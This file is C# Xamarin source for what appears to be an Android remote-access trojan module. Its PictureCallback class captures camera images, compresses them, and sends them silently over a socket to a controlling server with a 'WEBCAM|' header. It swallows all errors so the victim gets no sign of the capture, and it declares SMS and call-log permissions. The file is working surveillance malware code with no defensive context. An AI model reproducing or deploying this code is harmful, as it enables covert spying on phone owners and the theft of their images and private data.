using Android.App;
using Android.Content;
using Android.Hardware;
using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Task2
{
    [IntentFilter(new string[] {
    "android.provider.Telephony.READ_SMS","android.permission.READ_CALL_LOG"
    ,"android.permission.READ_SMS"}, Priority = (int)IntentFilterPriority.HighPriority)]
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public PictureCallback(int cameraID)
        {
            _cameraID = cameraID;
        }
        public void OnPictureTaken(byte[] data, Camera camera)
        {
            //Toast.MakeText(MainActivity.global_activity, "ONPICTURETAKEN", ToastLength.Long).Show();
            try
            {
                
                byte[] compressed = Compress(data);
                Send(MainActivity.Soketimiz,Encoding.UTF8.GetBytes("WEBCAM|" + compressed.Length.ToString()),0,
                   Encoding.UTF8.GetBytes("WEBCAM|" + compressed.Length.ToString()).Length,59999);
              Send(MainActivity.Soketimiz, compressed, 0, compressed.Length, 59999);
                
            }
            catch (Exception)
            {
                //Toast.MakeText(MainActivity.global_activity, "ERR ONPIC: " + ex.Message, ToastLength.Long).Show();
            }
            
            try {
               
                camera.StopPreview();
                camera.Release();
            }
            catch (Exception) { }
            
        }
        public static byte[] Compress(byte[] data)
        {
            using (MemoryStream output = new MemoryStream())
            {
                using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
                {
                    dstream.Write(data, 0, data.Length);
                }
                return output.ToArray();
            }
        }
        public static void Send(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            try
            {
                //int startTickCount = Environment.TickCount;
                int sent = 0;
                do
                {
                    //if (Environment.TickCount > startTickCount + timeout)
                    //  throw new Exception("Timeout.");
                    try
                    {
                        sent += socket.Send(buffer, offset + sent, size - sent, SocketFlags.None);
                    }
                    catch (SocketException ex)
                    {
                        if (ex.SocketErrorCode == SocketError.WouldBlock ||
                            ex.SocketErrorCode == SocketError.IOPending ||
                            ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                        {

                            Thread.Sleep(30);
                        }
                        else
                            throw ex;
                    }
                } while (sent < size);
            }
            catch (Exception) { }
        }                          
    }
}